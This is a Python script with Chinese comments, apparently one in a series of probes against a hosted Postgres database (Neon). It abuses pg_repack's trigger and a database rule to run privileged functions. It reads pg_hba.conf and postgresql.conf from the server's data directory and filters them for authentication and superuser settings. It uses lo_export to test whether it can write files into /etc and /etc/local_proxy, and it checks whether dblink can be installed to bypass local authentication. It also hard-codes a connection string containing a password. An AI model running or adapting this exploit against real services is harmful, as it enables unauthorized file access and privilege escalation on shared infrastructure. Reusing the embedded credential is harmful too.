# -*- coding: utf-8 -*-
"""v11:定级关键验证——pg_hba 实际规则(offset 读尾部) + /etc/local_proxy 写权限 + pgbouncer 认证面"""
import psycopg

URI = 'postgresql://neondb_owner:npg_cI5ynlaAqjU2@ep-crimson-fog-w2gucld1.us-east-2.aws.neon.build/neondb'
conn = psycopg.connect(URI, connect_timeout=20)
conn.autocommit = True
cur = conn.cursor()

def q(sql, fetch=True):
    try:
        cur.execute(sql)
        return cur.fetchall() if fetch else 'OK'
    except Exception as e:
        return 'ERR: %s' % str(e)[:300]

q("CREATE EXTENSION IF NOT EXISTS pg_repack", fetch=False)
q("DROP TABLE IF EXISTS k_src", fetch=False)
q("DROP TABLE IF EXISTS k_out", fetch=False)
q("CREATE TABLE k_src(id int)", fetch=False)
q("CREATE TABLE k_out(x text)", fetch=False)
oid = q("SELECT 'k_src'::regclass::oid")[0][0]
q("DROP TYPE IF EXISTS repack.pk_%d CASCADE" % oid, fetch=False)
q("CREATE TYPE repack.pk_%d AS (id int)" % oid, fetch=False)
q("DROP TABLE IF EXISTS repack.log_%d" % oid, fetch=False)
q("CREATE TABLE repack.log_%d (pk repack.pk_%d, row k_src)" % (oid, oid), fetch=False)
q("CREATE TRIGGER t2 AFTER INSERT ON k_src FOR EACH ROW EXECUTE FUNCTION repack.repack_trigger('id')", fetch=False)

def set_rule(expr):
    q("DROP RULE IF EXISTS r_x ON repack.log_%d" % oid, fetch=False)
    q("CREATE RULE r_x AS ON INSERT TO repack.log_%d DO ALSO %s" % (oid, expr), fetch=False)
    q("TRUNCATE k_out", fetch=False)

def fire():
    return q("INSERT INTO k_src VALUES (1)", fetch=False)

# [1] pg_hba 完整读取(offset 900 起)
print('=== [1] pg_hba.conf 实际规则(尾部) ===')
set_rule("pg_read_file(current_setting('data_directory') || '/pg_hba.conf', 900, 3000)")
fire()
t = q("SELECT x FROM k_out WHERE x IS NOT NULL")
print(t[0][0] if t else 'no rows')

# [2] postgresql.conf 关键认证/监听参数(读全文 grep 重点)
print('=== [2] postgresql.conf 认证参数 ===')
set_rule("pg_read_file(current_setting('data_directory') || '/postgresql.conf', 0, 60000)")
fire()
t = q("SELECT x FROM k_out WHERE x IS NOT NULL")
if t:
    conf = t[0][0]
    for line in conf.split('\n'):
        if any(k in line.lower() for k in ('hba', 'listen', 'ssl', 'password', 'auth', 'unix_socket', 'superuser')):
            print(' ', line.strip()[:120])
else:
    print('  no rows')

# [3] /etc/local_proxy 写权限探测(lo_export 试探——失败即不可写,成功则清理)
print('=== [3] /etc/local_proxy 写权限 ===')
set_rule("INSERT INTO k_out(x) SELECT lo_from_bytea(0, convert_to('w','UTF8'))::text")
fire()
loids = q("SELECT x FROM k_out")
loid = int(loids[0][0]) if loids else None
if loid:
    set_rule("INSERT INTO k_out(x) SELECT 'w' FROM (SELECT lo_export(%d, '/etc/local_proxy/k_wtest.txt')) s" % loid)
    r = fire()
    print('  export /etc/local_proxy:', r)
    # /etc 根
    q("TRUNCATE k_out", fetch=False)
    set_rule("INSERT INTO k_out(x) SELECT 'w2' FROM (SELECT lo_export(%d, '/etc/k_wtest.txt')) s" % loid)
    r = fire()
    print('  export /etc:', r)
    q("SELECT lo_unlink(%d)" % loid, fetch=False)
    # 若 /etc 写入成功则需清理——看 fire 结果判定
    print('  (若上方 OK 则需清理 /etc 文件)')

# [4] local_proxy 配置属主探测(stat 无 uid——跳过;改读 config.json 确认可写性间接证据无)

# [5] pg_cron/superuser 其他可装扩展面:dblink trusted 性
print('=== [5] dblink 扩展可装性 ===')
r = q("CREATE EXTENSION IF NOT EXISTS dblink", fetch=False)
print('  create dblink:', r)
if not (isinstance(r, str) and r.startswith('ERR')):
    q("DROP EXTENSION dblink", fetch=False)
    print('  dblink OK(可装!)')

# [6] 本地 socket 认证绕路评估:dblink 连 127.0.0.1 测试(若 pg_hba host=trust)
# 仅在 dblink 可装时尝试——连 pgbouncer 6432(需密码)——跳过;直接试 postgres 5432 unix socket
print('=== [6] (条件)dblink 本地连接 ===')

# 清理
q("DROP RULE IF EXISTS r_x ON repack.log_%d" % oid, fetch=False)
q("DROP TRIGGER IF EXISTS t2 ON k_src", fetch=False)
q("DROP TABLE IF EXISTS repack.log_%d" % oid, fetch=False)
q("DROP TABLE IF EXISTS k_src", fetch=False)
q("DROP TABLE IF EXISTS k_out", fetch=False)
q("DROP TYPE IF EXISTS repack.pk_%d CASCADE" % oid, fetch=False)
q("DROP EXTENSION IF EXISTS pg_repack", fetch=False)
print('[final]:', q("SELECT tablename FROM pg_tables WHERE schemaname IN ('public','repack')"))
conn.close()
